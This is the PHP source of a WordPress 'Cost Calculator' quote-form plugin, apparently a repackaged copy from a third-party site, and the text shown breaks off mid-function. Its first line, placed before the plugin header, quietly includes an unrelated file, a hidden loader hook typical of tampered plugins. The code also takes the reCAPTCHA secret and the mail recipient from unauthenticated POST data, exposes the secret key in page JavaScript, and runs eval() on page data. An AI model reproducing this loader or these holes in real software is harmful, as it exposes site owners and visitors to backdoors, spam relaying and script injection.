<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php

/**
 * Plugin Name: Cost Calculator ( - Themepa.com)
 * Description: Cost Calculator by BoldThemes
 * Version: 1.0.6
 * Author: BoldThemes
 * Author URI: http://codecanyon.net/user/boldthemes
 */

function bt_cc_enqueue() {
	wp_enqueue_script( 'bt_cc_dd', plugins_url() . '/bt_cost_calculator/jquery.dd.js', array( 'jquery' ) );
	wp_enqueue_style( 'bt_cc_style', plugins_url() . '/bt_cost_calculator/style.min.css' );
}
add_action( 'wp_enqueue_scripts', 'bt_cc_enqueue' );

/**
 * Load plugin textdomain.
 *
 * @since 1.0.0
 */
function bt_cc_load_textdomain() {
  load_plugin_textdomain( 'bt_plugin', false, dirname( plugin_basename( __FILE__ ) ) . '/languages' ); 
}
add_action( 'plugins_loaded', 'bt_cc_load_textdomain' );

// [bt_cost_calculator]
class bt_cost_calculator {

	static function init() {
		add_shortcode( 'bt_cost_calculator', array( __CLASS__, 'handle_shortcode' ) );
		add_action( 'wp_ajax_bt_cc', array( __CLASS__, 'bt_cc_callback' ) );
		add_action( 'wp_ajax_nopriv_bt_cc', array( __CLASS__, 'bt_cc_callback' ) );
	}
	
	static function bt_cc_callback() {
		$recaptcha_response = $_POST['recaptcha_response'];
		$recaptcha_secret = $_POST['recaptcha_secret'];
		$admin_email = $_POST['admin_email'];
		$email_client = $_POST['email_client'];
		$email_confirmation = $_POST['email_confirmation'];
		$subject = urldecode( $_POST['subject'] );
		$quote = urldecode( $_POST['quote'] );
		$total = $_POST['total'];
		$name = $_POST['name'];
		$email = strip_tags( $_POST['email'] );
		$phone = $_POST['phone'];
		$address = $_POST['address'];
		$date = isset($_POST['date'])?$_POST['date']:'';
		$time = isset($_POST['time'])?$_POST['time']:'';
		$message = $_POST['message'];
		
		if ( $recaptcha_response != '' && $recaptcha_secret != '' ) {
			$recaptcha_post = wp_remote_post( 'https://www.google.com/recaptcha/api/siteverify', array( 'body' => array( 'secret' => $recaptcha_secret, 'response' => $recaptcha_response ) ) );
			if ( is_wp_error( $recaptcha_post ) ) {
				echo 'recaptcha post error';
				die();
			} else {
				$json = json_decode( $recaptcha_post['body'] );
				if ( $json->success != 1 ) {
					echo 'recaptcha response false';
					die();
				}
			}
		}
		
		$message_to_admin = '<html><body>' . "\r\n";
		
		$message_to_admin .= '<table style="width:100%" cellspacing="0">' . "\r\n";
		if ( $quote != '' ) $message_to_admin .= $quote;
		$message_to_admin .= '<tr><td style="font-weight:bold;border-top:1px solid #888;padding:.5em;">' . __( 'Total', 'bt_plugin' ) . '</td><td style="text-align:right;font-weight:bold;border-top:1px solid #888;padding:.5em;">' . $total . '</td></tr>' . "\r\n";
		$message_to_admin .= '</table>' . "\r\n";
		
		$message_to_admin .= '<br>' . "\r\n";
	
		if ( $name != '' ) $message_to_admin .= '<div style="padding:.5em;"><b>' . __( 'Name', 'bt_plugin' ) . '</b>: ' . stripslashes( $name ) . '</div>' . "\r\n";
		if ( $email != '' ) $message_to_admin .= '<div style="padding:.5em;"><b>' . __( 'Email', 'bt_plugin' ) . '</b>: <a href="mailto:' . $email . '">' . $email . '</a></div>' . "\r\n";
		if ( $phone != '' ) $message_to_admin .= '<div style="padding:.5em;"><b>' . __( 'Phone', 'bt_plugin' ) . '</b>: ' . $phone . '</div>' . "\r\n";
		if ( $address != '' ) $message_to_admin .= '<div style="padding:.5em;"><b>' . __( 'Address', 'bt_plugin' ) . '</b>: ' . stripslashes( $address ) . '</div>' . "\r\n";
		if ( $date != '' ) $message_to_admin .= '<div style="padding:.5em;"><b>' . __( 'Service Date', 'bt_plugin' ) . '</b>: ' . $date . '</div>' . "\r\n";
		if ( $time != '' ) $message_to_admin .= '<div style="padding:.5em;"><b>' . __( 'Service Time', 'bt_plugin' ) . '</b>: ' . $time . '</div>' . "\r\n";
		if ( $message != '' ) $message_to_admin .= '<div style="padding:.5em;"><b>' . __( 'Message', 'bt_plugin' ) . '</b>: ' . stripslashes( $message ) . '</div>' . "\r\n";
		
		$message_to_admin .= '</body></html>';
		
		//$message_to_admin = quoted_printable_encode( $message_to_admin );
	
		$s = $subject;
		if ( $name != '' ) $s = $s . ' / ' . $name;
		
		try{
			$r = true;
			if ( $email_client == 'yes' && $email != '' &&  $email_confirmation == 'yes' ) {
				$headers = "From: " . $admin_email . "\r\n";
				$headers .= "MIME-Version: 1.0\r\n";
				$headers .= "Content-Type: text/html; charset=UTF-8\r\n";
				//$headers .= "Content-Transfer-Encoding: quoted-printable";
				$r = wp_mail( $email, $s, $message_to_admin, $headers );
			}
			$headers = '';
			//if ( $email != '' ) $headers = "From: " . $email . "\r\n"; // todo: email validation
			$headers .= "MIME-Version: 1.0\r\n";
			$headers .= "Content-Type: text/html; charset=UTF-8\r\n";
			//$headers .= "Content-Transfer-Encoding: quoted-printable";
			$r1 = wp_mail( $admin_email, $s, $message_to_admin, $headers );
			if ( $r && $r1 ) echo 'ok';
		} catch ( Exception $e ) {
			echo $e->getMessage();
		}
		
		die();
	}

	static function handle_shortcode( $atts, $content ) {
		extract( shortcode_atts( array(
			'admin_email'        => '',
			'subject'            => '',
			'email_client'       => '',
			'email_confirmation' => '',
			'time_start'         => '',
			'time_end'           => '',
			'currency'           => '',
			'm_name'             => '',
			'm_email'            => '',
			'm_phone'            => '',
			'm_address'          => '',
			'm_date'             => '',
			'm_time'             => '',
			'm_message'          => '',
			'accent_color'       => '',
			'show_booking'       => '',
			'rec_site_key'       => '',
			'rec_secret_key'     => '',
			'paypal_email'       => '',
			'paypal_cart_name'   => '',
			'paypal_currency'    => '',
			'el_class'           => '',
			'el_style'           => ''
		), $atts, 'bt_cost_calculator' ) );
		
		$admin_email = sanitize_text_field( $admin_email );
		$subject = sanitize_text_field( $subject );
		$email_client = sanitize_text_field( $email_client );
		$email_confirmation = sanitize_text_field( $email_confirmation );
		$time_start = sanitize_text_field( $time_start );
		$time_end = sanitize_text_field( $time_end );
		$currency = sanitize_text_field( $currency );
		$m_name = sanitize_text_field( $m_name );
		$m_email = sanitize_text_field( $m_email );
		$m_phone = sanitize_text_field( $m_phone );
		$m_address = sanitize_text_field( $m_address );
		$m_date = sanitize_text_field( $m_date );
		$m_time = sanitize_text_field( $m_time );
		$m_message = sanitize_text_field( $m_message );
		$accent_color = sanitize_text_field( $accent_color );
		$show_booking = sanitize_text_field( $show_booking );
		$rec_site_key = sanitize_text_field( $rec_site_key );
		$rec_secret_key = sanitize_text_field( $rec_secret_key );
		$paypal_email = sanitize_text_field( $paypal_email );
		$paypal_cart_name = sanitize_text_field( $paypal_cart_name );
		$paypal_currency = sanitize_text_field( $paypal_currency );
		$el_class = sanitize_text_field( $el_class );
		$el_style = sanitize_text_field( $el_style );
		
		wp_enqueue_script( 'jquery-ui' );
		wp_enqueue_script( 'jquery-ui-datepicker' );
		
		wp_enqueue_script( 'jquery-ui-slider' );
		
		wp_enqueue_script( 'bt_touch-punch_js', plugins_url() . '/bt_cost_calculator/jquery.ui.touch-punch.min.js', array( 'jquery-ui-slider' ) );
		
		$css_class = uniqid( 'c' );
		
		$proxy = new Cost_Proxy( $admin_email, $email_client, $email_confirmation, $subject, $m_name, $m_email, $m_phone, $m_address, $m_message, $m_date, $m_time, $accent_color, $rec_secret_key, $css_class );
		add_action( 'wp_footer', array( $proxy, 'js_init' ), 20 );
		
		$style_attr = '';
		if ( $el_style != '' ) {
			$style_attr = 'style="' . $el_style . '"';
		}
		
		if ( $m_name != '' ) $m_name = ' ' . 'btContactField' . $m_name;
		if ( $m_email != '' ) $m_email = ' ' . 'btContactField' . $m_email;
		if ( $m_phone != '' ) $m_phone = ' ' . 'btContactField' . $m_phone;
		if ( $m_address != '' ) $m_address = ' ' . 'btContactField' . $m_address;
		if ( $m_message != '' ) $m_message = ' ' . 'btContactField' . $m_message;
		if ( $m_date != '' ) $m_date = ' ' . 'btContactField' . $m_date;
		if ( $m_time != '' ) $m_time = ' ' . 'btContactField' . $m_time;

		$output = '<div class="btQuoteBooking ' . $el_class . ' ' . $css_class . '" ' . $style_attr . '><div class="btQuoteBookingWrap">';
			$output .= '<div class="btQuoteBookingForm btActive">';
				$output .= wptexturize( do_shortcode( $content ) );
				$output .= '<div class="btTotalNextWrapper">';
					$output .= '<div class="btQuoteTotal"><span class="btQuoteTotalText">' . __( 'Total', 'bt_plugin' ) . '</span><span class="btQuoteTotalCurrency">' . $currency . '</span><span class="btQuoteTotalCalc"></span></div>';
					if ( $paypal_email == '' ) {
						$output .= '<div class="boldBtn btnAccent btnSmall btnIco"><button type="submit" class="btContactNext">' . __( 'Next', 'bt_plugin' ) . '</button></div>';
					} else {
						$output .= '<div class="btPayPalButton" style="background-image:url(' . plugin_dir_url( __FILE__ ) . 'paypal.png);"></div><form class="btPayPalForm" action="https://www.paypal.com/cgi-bin/webscr" method="post">
						<input type="hidden" name="cmd" value="_cart">
						<input type="hidden" name="upload" value="1">
						<input type="hidden" name="business" value="' . $paypal_email . '">
						<input type="hidden" name="item_name" value="' . $paypal_cart_name . '">
						<input type="hidden" name="currency_code" value="' . $paypal_currency . '">
						<input type="image" src="' . plugin_dir_url( __FILE__ ) . 'paypal.png" name="submit" alt="PayPal">
						</form>';
					}
				$output .= '</div>';
			$output .= '</div>';
			
			if ( $paypal_email == '' ) {
			
				$output .= '<div class="btTotalQuoteContactGroup">';

					$output .= '<div class="btQuoteContact">';
						$output .= '<div class="btQuoteItem' . $m_name . '"><input type="text" class="btContactName btContactField" placeholder="' . __( 'Name', 'bt_plugin' ) . '"></div>';
						$output .= '<div class="btQuoteItem' . $m_email . '"><input type="text" class="btContactEmail btContactField" placeholder="' . __( 'Email', 'bt_plugin' ) . '"></div>';
						$output .= '<div class="btQuoteItem' . $m_phone . '"><input type="text" class="btContactPhone btContactField" placeholder="' . __( 'Phone', 'bt_plugin' ) . '"></div>';
						$output .= '<div class="btQuoteItem' . $m_phone . '"><input type="text" class="btContactAddress btContactField" placeholder="' . __( 'Address', 'bt_plugin' ) . '"></div>';
						
						if ( $show_booking != '' ) {
							$output .= '<div class="btQuoteItem' . $m_date . '"><input type="text" class="btContactDate btContactField" placeholder="' . __( 'Preferred Service Date', 'bt_plugin' ) . '"></div>';
							$output .= '<div class="btQuoteItem' . $m_time . '">';
								$output .= '<div class="btContactTime btContactField btDropDown"></div>';
								if ( $time_start == '' ) $time_start = 0;
								if ( $time_end == '' ) $time_end = 23;
								$proxy = new CostTime_Proxy( $time_start, $time_end, __( 'Preferred Service Time', 'bt_plugin' ), $css_class );
								add_action( 'wp_footer', array( $proxy, 'js_init' ), 20 );
							$output .= '</div>';
						}
						
						$output .= '<div class="btQuoteItem' . $m_message . ' btQuoteItemFullWidth"><textarea class="btContactMessage btContactField" placeholder="' . __( 'Message', 'bt_plugin' ) . '"></textarea></div>';
						
						if ( $email_confirmation == 'yes' ) {
							$output .= '<div class="bt_cc_email_confirmation_container"><input id="bt_cc_email_confirmation" type="checkbox" value="yes"><label for="bt_cc_email_confirmation">' . __( 'Email me quote!', 'bt_plugin' ) . '</label></div>';
						}						
						
						if ( $rec_site_key != '' && $rec_secret_key != '' ) {
							wp_enqueue_script( 'bt_recaptcha', 'https://www.google.com/recaptcha/api.js' );
							$output .= '<div class="g-recaptcha" data-sitekey="' . $rec_site_key . '"></div>';
						}
						
						$output .= '<div class="boldBtn btnAccent btnSmall btnIco"><button type="submit" class="btContactSubmit">' . __( 'Submit', 'bt_plugin' ) . '</button></div>';
						
						$output .= '<div class="btSubmitMessage"></div>';
						
					$output .= '</div>';
				
				$output .= '</div>';
			}
			
		$output .= '</div>';
		$output .= '</div>';
		
		return $output;
	}
}

class Cost_Proxy {
	function __construct( $admin_email, $email_client, $email_confirmation, $subject, $m_name, $m_email, $m_phone, $m_address, $m_date, $m_time, $m_message, $accent_color, $rec_secret_key, $css_class ) {
		$this->admin_email = $admin_email;
		$this->email_client = $email_client;
		$this->email_confirmation = $email_confirmation;
		$this->subject = $subject;
		$this->m_name = $m_name;
		$this->m_email = $m_email;
		$this->m_phone = $m_phone;
		$this->m_address = $m_address;
		$this->m_date = $m_date;
		$this->m_time = $m_time;
		$this->m_message = $m_message;
		$this->accent_color = $accent_color;
		$this->rec_secret_key = $rec_secret_key;
		$this->css_class = $css_class;
	}	

	public function js_init() { ?>
		<script>
			(function( $ ) {
				
				var css_class = '<?php echo $this->css_class; ?>';
				var c = $( '.' + css_class );
				
				$( window ).ready(function() {
					setTimeout( function(){ c.css( 'opacity', '1' ); }, 200 );
				});
			
				var accent_color = '<?php echo $this->accent_color; ?>';
				
				var rec_secret_key = '<?php echo $this->rec_secret_key; ?>';
				
				if ( accent_color != '' ) {
					$( 'head' ).append( '<style>.btQuoteBooking.' + css_class + ' .btContactNext { color: ' + accent_color + ' !important; border: ' + accent_color + ' 2px solid !important; }.btQuoteBooking.' + css_class + '  input[type="text"]:hover, .btQuoteBooking.' + css_class + '  input[type="email"]:hover, .btQuoteBooking.' + css_class + '  input[type="password"]:hover, .btQuoteBooking.' + css_class + '  textarea:hover, .btQuoteBooking.' + css_class + '  .fancy-select .trigger:hover {	box-shadow: 0 0 0 ' + accent_color + ' inset, 0 1px 5px rgba(0,0,0,0.2) !important;}.btQuoteBooking.' + css_class + ' .dd.ddcommon.borderRadius:hover .ddTitleText {	box-shadow: 0 0 0 ' + accent_color + ' inset, 0 1px 5px rgba(0,0,0,0.2) !important;}.btQuoteBooking.' + css_class + '  input[type="text"]:focus, .btQuoteBooking.' + css_class + '  input[type="email"]:focus, .btQuoteBooking.' + css_class + '  textarea:focus, .btQuoteBooking.' + css_class + '  .fancy-select .trigger.open {	box-shadow: 5px 0 0 ' + accent_color + ' inset, 0 2px 10px rgba(0,0,0,0.2) !important;}.btQuoteBooking.' + css_class + ' .dd.ddcommon.borderRadiusTp .ddTitleText, .btQuoteBooking.' + css_class + ' .dd.ddcommon.borderRadiusBtm .ddTitleText {	box-shadow: 5px 0 0 ' + accent_color + ' inset, 0 2px 10px rgba(0,0,0,0.2) !important;}.btQuoteBooking.' + css_class + '  .ui-slider .ui-slider-handle {	background: ' + accent_color + ' !important;}.btQuoteBooking.' + css_class + ' .btQuoteBookingForm .btQuoteTotal {	background: ' + accent_color + ' !important;}.btQuoteBooking.' + css_class + '  .btContactFieldMandatory input:hover, .btQuoteBooking.' + css_class + '  .btContactFieldMandatory textarea:hover {	box-shadow: 0 0 0 1px #AAA inset, 0 0 0 ' + accent_color + ' inset, 0 1px 5px rgba(0,0,0,0.2) !important;}.btQuoteBooking.' + css_class + ' .btContactFieldMandatory .dd.ddcommon.borderRadius:hover .ddTitleText {	box-shadow: 0 0 0 1px #AAA inset, 0 0 0 ' + accent_color + ' inset, 0 1px 5px rgba(0,0,0,0.2) !important;}.btQuoteBooking.' + css_class + '  .btContactFieldMandatory input:focus, .btQuoteBooking.' + css_class + '  .btContactFieldMandatory textarea:focus {	box-shadow: 0 0 0 1px #AAA inset, 5px 0 0 ' + accent_color + ' inset, 0 1px 5px rgba(0,0,0,0.2) !important;}.btQuoteBooking.' + css_class + ' .btContactFieldMandatory .dd.ddcommon.borderRadiusTp .ddTitleText {	box-shadow: 0 0 0 1px #AAA inset, 5px 0 0 ' + accent_color + ' inset, 0 1px 5px rgba(0,0,0,0.2) !important;}.btQuoteBooking.' + css_class + '  .btContactFieldMandatory.btContactFieldError input, .btQuoteBooking.' + css_class + '  .btContactFieldMandatory.btContactFieldError textarea {	border: 1px solid ' + accent_color + ' !important;	box-shadow: 0 0 0 1px ' + accent_color + ' inset !important;}.btQuoteBooking.' + css_class + ' .btContactFieldMandatory.btContactFieldError .dd.ddcommon.borderRadius .ddTitleText {	border: 1px solid ' + accent_color + ' !important;	box-shadow: 0 0 0 1px ' + accent_color + ' inset !important;}.btQuoteBooking.' + css_class + '  .btContactFieldMandatory.btContactFieldError input:hover, .btQuoteBooking.' + css_class + '  .btContactFieldMandatory.btContactFieldError textarea:hover {	box-shadow: 0 0 0 1px ' + accent_color + ' inset, 0 0 0 ' + accent_color + ' inset, 0 1px 5px rgba(0,0,0,0.2) !important;}.btQuoteBooking.' + css_class + ' .btContactFieldMandatory.btContactFieldError .dd.ddcommon.borderRadius:hover .ddTitleText {	box-shadow: 0 0 0 1px ' + accent_color + ' inset, 0 0 0 ' + accent_color + ' inset, 0 1px 5px rgba(0,0,0,0.2) !important;}.btQuoteBooking.' + css_class + '  .btContactFieldMandatory.btContactFieldError input:focus, .btQuoteBooking.' + css_class + '  .btContactFieldMandatory.btContactFieldError textarea:focus {	box-shadow: 0 0 0 1px ' + accent_color + ' inset, 5px 0 0 ' + accent_color + ' inset, 0 1px 5px rgba(0,0,0,0.2) !important;}.btQuoteBooking.' + css_class + ' .btContactFieldMandatory.btContactFieldError .dd.ddcommon.borderRadiusTp .ddTitleText {	box-shadow: 0 0 0 1px ' + accent_color + ' inset, 5px 0 0 ' + accent_color + ' inset, 0 1px 5px rgba(0,0,0,0.2) !important;}.btQuoteBooking.' + css_class + ' .btSubmitMessage {	color: ' + accent_color + ' !important;}.btDatePicker .ui-datepicker-header {	background-color: ' + accent_color + ' !important;}.btQuoteBooking.' + css_class + ' .btContactSubmit {	background-color: ' + accent_color + ' !important;}.btQuoteBooking.' + css_class + ' .btQuoteSwitch.on .btQuoteSwitchInner{background: ' + accent_color + ' !important;}</style>' );
				}
				
	            c.find( '.btContactDate' ).datepicker({
					beforeShow: function( input, inst ) {
						$( '.ui-datepicker' ).addClass( 'btDatePicker' );
					}
				});
				
				c.find( '.btQuoteSlider' ).each(function() {
					$( this ).slider({
						min: $( this ).data( 'min' ),
						max: $( this ).data( 'max' ),
						step: $( this ).data( 'step' )
					});
				});
				
				c.find( '.ui-slider-handle' ).each(function() {
					$( this ).append( $( this ).closest( '.btQuoteItemInput' ).find( $( '.btQuoteSliderValue' ) ) );
				});
				
				c.find( '.btQuoteSwitch' ).on( 'click', function() {
					if ( $( this ).hasClass( 'on' ) ) { 
						$( this ).removeClass( 'on' );
					} else {
						$( this ).addClass( 'on' );
					}
					bt_quote_total( c );
					bt_paypal_items( c );
				});
				
				c.find( '.btPayPalButton' ).on( 'click', function() {
					$( this ).next().submit();
				});
				
				var bt_parse_float = function( x ) {
					r = parseFloat( x );
					if ( isNaN( r ) ) r = 0;
					return r;
				}
				
				var total = 0;
				total = total.toFixed( 2 );
				
				window.bt_quote_total = function( c ) {
					
					var c = $( c );
				
					total = 0;

					c.find( '.btQuoteText' ).not( '.btQuoteMBlock .btQuoteText' ).not( '.btQuoteGBlock .btQuoteText' ).each(function() {
						var unit_price = bt_parse_float( $( this ).data( 'price' ) );
						var val = bt_parse_float( $( this ).val() );
						val = val * unit_price;
						total += val;
					});
					
					c.find( '.btQuoteSelect' ).not( '.btQuoteMBlock .btQuoteSelect' ).not( '.btQuoteGBlock .btQuoteSelect' ).find( '._msddli_.selected' ).each(function() {
						var val = bt_parse_float( $( this ).data( 'value' ) );
						total += val;
					});
					
					c.find( '.btQuoteSlider' ).not( '.btQuoteMBlock .btQuoteSlider' ).not( '.btQuoteGBlock .btQuoteSlider' ).each(function() {
						var unit_price = bt_parse_float( $( this ).data( 'price' ) );
						var offset = bt_parse_float( $( this ).data( 'offset' ) );
						var val = bt_parse_float( $( this ).slider( 'value' ) );
						$( this ).parent().find( '.btQuoteSliderValue' ).html( val );
						val = val * unit_price;
						total += val;
						if ( ! $( this ).closest( '.btQuoteBooking' ).find( '.btPayPalButton' ).length > 0 ) {
							total += offset;
						}
					});
					
					c.find( '.btQuoteSwitch' ).not( '.btQuoteMBlock .btQuoteSwitch' ).not( '.btQuoteGBlock .btQuoteSwitch' ).each(function() {
						if ( $( this ).hasClass( 'on' ) ) {
							total += bt_parse_float( $( this ).data( 'on' ) );
						} else {
							total += bt_parse_float( $( this ).data( 'off' ) );
						}
					});
					
					// multiply
					
					c.find( '.btQuoteMBlock' ).each(function() {
						var m_total = 0;
						var m_first = true;
						$( this ).find( '.btQuoteText' ).each(function() {
							var unit_price = bt_parse_float( $( this ).data( 'price' ) );
							var val = bt_parse_float( $( this ).val() );
							val = val * unit_price;
							if ( m_first ) {
								m_total = val;
							} else {
								m_total *= val;
							}
							m_first = false;
						});
						
						$( this ).find( '.btQuoteSelect' ).find( '._msddli_.selected' ).each(function() {
							var val = bt_parse_float( $( this ).data( 'value' ) );
							if ( m_first ) {
								m_total = val;
							} else {
								m_total *= val;
							}
							m_first = false;
						});
						
						$( this ).find( '.btQuoteSlider' ).each(function() {
							var unit_price = bt_parse_float( $( this ).data( 'price' ) );
							var offset = bt_parse_float( $( this ).data( 'offset' ) );
							var val = bt_parse_float( $( this ).slider( 'value' ) );
							$( this ).parent().find( '.btQuoteSliderValue' ).html( val );
							val = val * unit_price;
							if ( m_first ) {
								m_total = val;
							} else {
								m_total *= val;
							}
							m_total += offset;
							m_first = false;
						});
						
						$( this ).find( '.btQuoteSwitch' ).each(function() {
							if ( $( this ).hasClass( 'on' ) ) {
								var val = bt_parse_float( $( this ).data( 'on' ) );
							} else {
								var val = bt_parse_float( $( this ).data( 'off' ) );
							}							
							if ( m_first ) {
								m_total = val;
							} else {
								m_total *= val;
							}
							m_first = false;
						});
						
						total += m_total;
						
					});
					
					// group
					
					c.find( '.btQuoteGBlock' ).each(function() {
						
						var eval_code = $( this ).data( 'eval' );
						
						var group_array = [];
						
						$( this ).find( '.btQuoteItem .btQuoteItemInput' ).each(function() {
							
							var val = 0;
							
							$( this ).find( '.btQuoteText' ).each(function() {
								var unit_price = bt_parse_float( $( this ).data( 'price' ) );
								val = bt_parse_float( $( this ).val() );
								val = val * unit_price;
							});
							
							$( this ).find( '.btQuoteSelect' ).find( '._msddli_.selected' ).each(function() {
								val = bt_parse_float( $( this ).data( 'value' ) );
							});
							
							$( this ).find( '.btQuoteSlider' ).each(function() {
								var unit_price = bt_parse_float( $( this ).data( 'price' ) );
								var offset = bt_parse_float( $( this ).data( 'offset' ) );
								val = bt_parse_float( $( this ).slider( 'value' ) );
								$( this ).parent().find( '.btQuoteSliderValue' ).html( val );
								val = val * unit_price;
							});
							
							$( this ).find( '.btQuoteSwitch' ).each(function() {
								if ( $( this ).hasClass( 'on' ) ) {
									val = bt_parse_float( $( this ).data( 'on' ) );
								} else {
									val = bt_parse_float( $( this ).data( 'off' ) );
								}
							});
							
							group_array.push( val );

						});

						var patt = /\$\d+/igm;
						var match = eval_code.match( patt );
						
						for ( var i = 0; i < match.length; i++ ) {
							eval_code = eval_code.replace( match[ i ], group_array[ i ] );
						}
						
						var g_total = eval( '(function() {' + eval_code + '}())' );
						
						total += g_total;
						
					});
					
					total = total.toFixed( 2 ).replace( /(\d)(?=(\d{3})+\.)/g, '$1,' );
					
					c.find( '.btQuoteTotalCalc' ).html( total );
				}
				
				bt_quote_total( c );
				
				window.bt_paypal_items = function( c ) {
					
					$( c ).each(function() {
					
						if ( $( this ).find( '.btPayPalButton' ).length > 0 ) {
							
							var form = $( this ).find( '.btPayPalButton' ).next();
							form.find( '.btPayPalItem' ).remove();
							
							var x = 0;
					
							$( this ).find( '.btQuoteBookingForm' ).children( '.btQuoteItem' ).each(function() {
								
								var unit_price = 0;
								var val = 0;
								
								var selected_name = '';

								$( this ).find( '.btQuoteText' ).each(function() {
									unit_price = bt_parse_float( $( this ).data( 'price' ) );
									val = bt_parse_float( $( this ).val() );
								});
								
								$( this ).find( '.btQuoteSelect' ).find( '._msddli_.selected' ).each(function() {
									unit_price = bt_parse_float( $( this ).data( 'value' ) );
									val = 1;
									selected_name = $( this ).find( '.ddlabel' )[0].innerHTML;
									if ( $( this ).is( ':first-child' ) ) {
										selected_name = '';
									}
								});
								
								$( this ).find( '.btQuoteSlider' ).each(function() {
									unit_price = bt_parse_float( $( this ).data( 'price' ) );
									val = bt_parse_float( $( this ).slider( 'value' ) );
								});
								
								$( this ).find( '.btQuoteSwitch' ).each(function() {
									if ( $( this ).hasClass( 'on' ) ) {
										unit_price = bt_parse_float( $( this ).data( 'on' ) );
									} else {
										unit_price = bt_parse_float( $( this ).data( 'off' ) );
									}
									val = 1;
								});

								var label = $( this ).find( 'label' ).html();
								if ( selected_name != '' ) {
									selected_name = selected_name.replace( '<span class="description">', '/' );
									selected_name = selected_name.replace( '</span>', '' );
									if ( label.endsWith( '?' ) || label.endsWith( ':' ) ) {
										label = label + ' ' + selected_name;
									} else {
										label = label + ': ' + selected_name;
									}
									
								}

								val = val * unit_price;
					
								if ( label !== undefined && val > 0 ) {
									x++;
									val = val.toFixed( 2 );
									form.append( '<input type="hidden" name="item_name_' + x + '" value="' + label + '" class="btPayPalItem"><input type="hidden" name="amount_' + x + '" value="' + val + '" class="btPayPalItem">' );
								}
							});
							
							
							// multiply
							
							$( this ).find( '.btQuoteBookingForm' ).children( '.btQuoteMBlock' ).each(function() {

								var m_total = 1;
								var m_first = true;
								var m_val = 0;
								var selected_name = '';
								var label = '';
								
								$( this ).find( '.btQuoteItem' ).each(function() {
							
									$( this ).find( '.btQuoteText' ).each(function() {
										var unit_price = bt_parse_float( $( this ).data( 'price' ) );
										var val = bt_parse_float( $( this ).val() );
										val = val * unit_price;
										if ( m_first ) {
											m_val = val;
											label = $( this ).closest( '.btQuoteItem' ).find( 'label' ).html();
										} else {
											m_total *= val;
										}
										m_first = false;
									});
									
									$( this ).find( '.btQuoteSelect' ).find( '._msddli_.selected' ).each(function() {
										var val = bt_parse_float( $( this ).data( 'value' ) );
										if ( m_first ) {
											m_val = val;
											label = $( this ).closest( '.btQuoteItem' ).find( 'label' ).html();
											selected_name = $( this ).find( '.ddlabel' )[0].innerHTML;
											selected_name = selected_name.substring( 0, selected_name.indexOf( '<span' ) );
											if ( $( this ).is( ':first-child' ) ) {
												selected_name = '';
											}
											if ( selected_name != '' ) label = label + ': ' + selected_name;											
										} else {
											m_total *= val;
										}
										m_first = false;
									});
									
									$( this ).find( '.btQuoteSlider' ).each(function() {
										var unit_price = bt_parse_float( $( this ).data( 'price' ) );
										var val = bt_parse_float( $( this ).slider( 'value' ) );
										$( this ).parent().find( '.btQuoteSliderValue' ).html( val );
										val = val * unit_price;
										if ( m_first ) {
											m_val = val;
											label = $( this ).closest( '.btQuoteItem' ).find( 'label' ).html();
										} else {
											m_total *= val;
										}
										m_first = false;
									});
									
									$( this ).find( '.btQuoteSwitch' ).each(function() {
										if ( $( this ).hasClass( 'on' ) ) {
											var val = bt_parse_float( $( this ).data( 'on' ) );
										} else {
											var val = bt_parse_float( $( this ).data( 'off' ) );
										}							
										if ( m_first ) {
											m_val = val;
											label = $( this ).closest( '.btQuoteItem' ).find( 'label' ).html();
										} else {
											m_total *= val;
										}
										m_first = false;
									});
									
									
								});
								
								if ( m_total > 0 && m_val > 0 ) {
									x++;
									m_val = m_val.toFixed( 2 );
									form.append( '<input type="hidden" name="item_name_' + x + '" value="' + label + '" class="btPayPalItem"><input type="hidden" name="amount_' + x + '" value="' + m_val + '" class="btPayPalItem"><input type="hidden" name="quantity_' + x + '" value="' + m_total + '" class="btPayPalItem">' );
								}

							});							
							
							
							// group
							
							$( this ).find( '.btQuoteBookingForm' ).children( '.btQuoteGBlock' ).each(function() {
								
								var eval_code = $( this ).data( 'eval' );
								
								var paypal_label = $( this ).data( 'paypal_label' );
									
								var group_array = [];
								
								$( this ).find( '.btQuoteItem' ).each(function() {
									
									var val;
							
									$( this ).find( '.btQuoteText' ).each(function() {
										var unit_price = bt_parse_float( $( this ).data( 'price' ) );
										val = bt_parse_float( $( this ).val() );
										val = val * unit_price;
									});
									
									$( this ).find( '.btQuoteSelect' ).find( '._msddli_.selected' ).each(function() {
										val = bt_parse_float( $( this ).data( 'value' ) );
									});
									
									$( this ).find( '.btQuoteSlider' ).each(function() {
										var unit_price = bt_parse_float( $( this ).data( 'price' ) );
										val = bt_parse_float( $( this ).slider( 'value' ) );
										$( this ).parent().find( '.btQuoteSliderValue' ).html( val );
										val = val * unit_price;
									});
									
									$( this ).find( '.btQuoteSwitch' ).each(function() {
										if ( $( this ).hasClass( 'on' ) ) {
											val = bt_parse_float( $( this ).data( 'on' ) );
										} else {
											val = bt_parse_float( $( this ).data( 'off' ) );
										}
									});
									
									group_array.push( val );
									
								});
								
								var patt = /\$\d/igm;
								var match = eval_code.match( patt );
								
								for ( var i = 0; i < match.length; i++ ) {
									eval_code = eval_code.replace( match[ i ], group_array[ i ] );
								}
								
								var g_total = eval( '(function() {' + eval_code + '}())' );
								
								if ( paypal_label != '' && g_total > 0 ) {
									x++;
									g_total = g_total.toFixed( 2 );
									form.append( '<input type="hidden" name="item_name_' + x + '" value="' + paypal_label + '" class="btPayPalItem"><input type="hidden" name="amount_' + x + '" value="' + g_total + '" class="btPayPalItem"><input type="hidden" name="quantity_' + x + '" value="1" class="btPayPalItem">' );
								}

							});
						}
					});
				}
				
				bt_paypal_items( c );
				
				c.find( '.btQuoteText' ).keyup(function() {
					bt_quote_total( c );
					bt_paypal_items( c );
				});

				c.find( '.btQuoteSlider' ).each(function() {
					var this_slider = $( this );
					$( this ).slider({
						slide: function( event, ui ) {
							var val = ui.value;
							this_slider.slider( 'value', val );
							bt_quote_total( c );
							bt_paypal_items( c );
						}
					});
				});
				
				c.find( '.btContactNext' ).click(function() {
					$( 'html, body' ).delay( 1000 ).animate({
						scrollTop: ( $( this ).closest( '.btQuoteBooking' ).find( '.btTotalQuoteContactGroup' ).offset().top - 30 )
					}, 400 );
					
					var contact_group = $( this ).closest( '.btQuoteBooking' ).find( '.btTotalQuoteContactGroup' );
					
					$( this ).closest( '.btQuoteBooking' ).find( '.btTotalQuoteContactGroup' ).addClass( 'btActive' );
